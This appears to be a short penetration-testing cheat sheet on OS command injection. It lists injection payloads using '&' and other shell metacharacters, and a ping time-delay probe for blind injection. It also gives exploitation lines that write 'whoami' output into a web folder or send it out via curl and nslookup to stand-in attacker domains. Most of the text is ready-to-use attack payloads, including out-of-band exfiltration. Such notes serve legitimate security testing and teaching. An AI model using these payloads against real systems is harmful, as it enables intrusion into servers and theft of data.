# OS command injection

### <mark style="color:yellow;">Command injection</mark>

```sh
& echo qwerty &
```

Placing `&` after the injected command is generally useful because it separates the injected command from whatever follows the injection point

### <mark style="color:yellow;">Blind OS command</mark>

**Detection**

```sh
# 10 sec. time delay
& ping -c 10 127.0.0.1 &
```

**Exploit**

1. Redirecting output. Note: you must have write permission

```sh
& whoami > /var/www/static/whoami.txt &
curl https://website.com/whoami.txt
```

2. Out-of-band techniques

```sh
& curl `whoami`.webserver-attacker.com & # HTTP traffic may be blocked
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

### <mark style="color:yellow;">Bypass restriction</mark>

* There are so many ways ...
  * [https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)

### <mark style="color:yellow;">Metacharacters</mark>

```sh
# Windows & Unix
&
&&
|
||

# Unix
;

# Unix inline execution
`command`
$(command)
```
